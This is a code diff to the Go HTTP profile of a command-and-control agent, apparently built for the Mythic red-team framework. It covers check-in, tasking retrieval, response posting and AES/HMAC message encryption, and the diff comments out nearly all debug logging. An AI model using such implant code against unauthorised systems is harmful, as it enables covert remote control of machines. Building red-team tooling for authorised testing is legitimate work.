@@ -79,7 +79,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	}
 
 	if h.Debug {
-		log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
+		// log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
 	}
 
 	body, err := json.Marshal(checkinMsg)
@@ -91,7 +91,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	if h.EncryptionKey != "" {
 		body = h.encryptMessage(body)
 		if h.Debug {
-			log.Printf("[DEBUG] Checkin message encrypted")
+			// log.Printf("[DEBUG] Checkin message encrypted")
 		}
 	}
 
@@ -117,7 +117,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	}
 
 	if h.Debug {
-		log.Printf("[DEBUG] Checkin response body: %s", string(respBody))
+		// log.Printf("[DEBUG] Checkin response body: %s", string(respBody))
 	}
 
 	// Decrypt the checkin response if needed
@@ -126,14 +126,14 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 		// Base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
-			log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
+			// log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
 			return fmt.Errorf("failed to decode checkin response: %w", err)
 		}
 		
 		// Decrypt the response
 		decryptedResponse, err = h.decryptResponse(decodedData)
 		if err != nil {
-			log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
+			// log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
 			return fmt.Errorf("failed to decrypt checkin response: %w", err)
 		}
 	} else {
@@ -143,8 +143,8 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	// Parse the response to extract callback UUID
 	var checkinResponse map[string]interface{}
 	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
-		log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
-		log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
+		// log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
+		// log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
 		return fmt.Errorf("failed to parse checkin response: %w", err)
 	}
 
@@ -170,7 +170,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 // GetTasking retrieves tasks from Mythic
 func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	if h.Debug {
-		log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.Endpoint)
+		// log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.Endpoint)
 	}
 	taskingMsg := structs.TaskingMessage{
 		Action:      "get_tasking",
@@ -190,7 +190,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	if h.EncryptionKey != "" {
 		body = h.encryptMessage(body)
 		if h.Debug {
-			log.Printf("[DEBUG] Tasking message encrypted")
+			// log.Printf("[DEBUG] Tasking message encrypted")
 		}
 	}
 
@@ -201,32 +201,32 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 
 	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
-		log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
+		// log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
 		return nil, fmt.Errorf("get tasking request failed: %w", err)
 	}
 	defer resp.Body.Close()
 
-	log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
+	// log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
 
 	if resp.StatusCode != http.StatusOK {
-		log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
+		// log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
 		return nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
 	}
 
 	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
-		log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
+		// log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
 		return nil, fmt.Errorf("failed to read response body: %w", err)
 	}
 
-	log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
-	log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))
+	// log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
+	// log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))
 
 	// Decrypt the response if encryption key is provided
 	var decryptedData []byte
 	if h.EncryptionKey != "" {
 		if h.Debug {
-			log.Printf("[DEBUG] Decrypting response...")
+			// log.Printf("[DEBUG] Decrypting response...")
 		}
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
@@ -240,26 +240,26 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 			return nil, fmt.Errorf("failed to decrypt response: %w", err)
 		}
 		if h.Debug {
-			log.Printf("[DEBUG] Decryption successful")
+			// log.Printf("[DEBUG] Decryption successful")
 		}
 	} else {
 		decryptedData = respBody
 	}
 
-	log.Printf("[DEBUG] Attempting to parse response as JSON")
+	// log.Printf("[DEBUG] Attempting to parse response as JSON")
 
 	// Parse the decrypted response - Mythic returns different formats
 	var taskResponse map[string]interface{}
 	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
 		// If not JSON, might be no tasks
-		log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
+		// log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
 		return []structs.Task{}, nil
 	}
 
-	log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
-	for key, _ := range taskResponse {
-		log.Printf("[DEBUG] Response contains key: %s", key)
-	}
+	// log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
+	// for key, _ := range taskResponse {
+	//	// log.Printf("[DEBUG] Response contains key: %s", key)
+	// }
 
 	// Extract tasks from response
 	var tasks []structs.Task
@@ -299,9 +299,9 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	}
 
 	// Extract UUID (first 36 bytes)
-	uuidBytes := encryptedData[:36]
+	_ = encryptedData[:36] // uuidBytes for potential debug use
 	if h.Debug {
-		log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
+		// log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
 	}
 
 	// Extract IV (next 16 bytes)
@@ -313,7 +313,7 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	// Extract ciphertext (everything between IV and HMAC)
 	ciphertext := encryptedData[52 : len(encryptedData)-32]
 
-	log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))
+	// log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))
 
 	// Verify HMAC
 	mac := hmac.New(sha256.New, key)
@@ -322,12 +322,12 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	expectedHmac := mac.Sum(nil)
 
 	if h.Debug {
-		log.Printf("[DEBUG] HMAC verification: %v", hmac.Equal(hmacBytes, expectedHmac))
+		// log.Printf("[DEBUG] HMAC verification: %v", hmac.Equal(hmacBytes, expectedHmac))
 	}
 
 	if !hmac.Equal(hmacBytes, expectedHmac) {
 		if h.Debug {
-			log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
+			// log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
 		}
 		
 		// Try HMAC on IV + ciphertext (alternative method for Mythic)
@@ -339,7 +339,7 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 			return nil, fmt.Errorf("HMAC verification failed with all methods")
 		}
 		if h.Debug {
-			log.Printf("[DEBUG] Alternative HMAC method succeeded")
+			// log.Printf("[DEBUG] Alternative HMAC method succeeded")
 		}
 	}
 
@@ -376,10 +376,10 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 // getActiveUUID returns the callback UUID if available, otherwise the payload UUID
 func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
 	if h.CallbackUUID != "" {
-		log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
+		// log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
 		return h.CallbackUUID
 	}
-	log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
+	// log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
 	return agent.PayloadUUID
 }
 
@@ -399,7 +399,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	if h.EncryptionKey != "" {
 		body = h.encryptMessage(body)
 		if h.Debug {
-			log.Printf("[DEBUG] Response message encrypted")
+			// log.Printf("[DEBUG] Response message encrypted")
 		}
 	}
 
@@ -418,8 +418,8 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	}
 
 	if h.Debug {
-		respBody, _ := io.ReadAll(resp.Body)
-		log.Printf("[DEBUG] Post response result: %s", string(respBody))
+		_, _ = io.ReadAll(resp.Body) // respBody for potential debug use
+		// log.Printf("[DEBUG] Post response result: %s", string(respBody))
 	}
 
 	return nil
@@ -429,7 +429,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
 	url := h.BaseURL + path
 	if h.Debug {
-		log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
+		// log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
 	}
 
 	var reqBody io.Reader
@@ -448,12 +448,12 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 	req.Header.Set("Accept", "*/*")
 
 	if h.Debug {
-		log.Printf("[DEBUG] Making %s request to %s", method, url)
+		// log.Printf("[DEBUG] Making %s request to %s", method, url)
 	}
 
 	resp, err := h.client.Do(req)
 	if err != nil {
-		log.Printf("[DEBUG] HTTP request failed: %v", err)
+		// log.Printf("[DEBUG] HTTP request failed: %v", err)
 		return nil, fmt.Errorf("HTTP request failed: %w", err)
 	}
 	
@@ -480,7 +480,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
 	if err != nil {
 		if h.Debug {
-			log.Printf("[DEBUG] Failed to decode encryption key: %v", err)
+			// log.Printf("[DEBUG] Failed to decode encryption key: %v", err)
 		}
 		return msg
 	}
@@ -489,7 +489,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		if h.Debug {
-			log.Printf("[DEBUG] Failed to create AES cipher: %v", err)
+			// log.Printf("[DEBUG] Failed to create AES cipher: %v", err)
 		}
 		return msg
 	}
@@ -498,7 +498,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	iv := make([]byte, aes.BlockSize)
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
 		if h.Debug {
-			log.Printf("[DEBUG] Failed to generate IV: %v", err)
+			// log.Printf("[DEBUG] Failed to generate IV: %v", err)
 		}
 		return msg
 	}
@@ -510,7 +510,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	padded, err := pkcs7Pad(msg, aes.BlockSize)
 	if err != nil {
 		if h.Debug {
-			log.Printf("[DEBUG] Failed to pad message: %v", err)
+			// log.Printf("[DEBUG] Failed to pad message: %v", err)
 		}
 		return msg
 	}
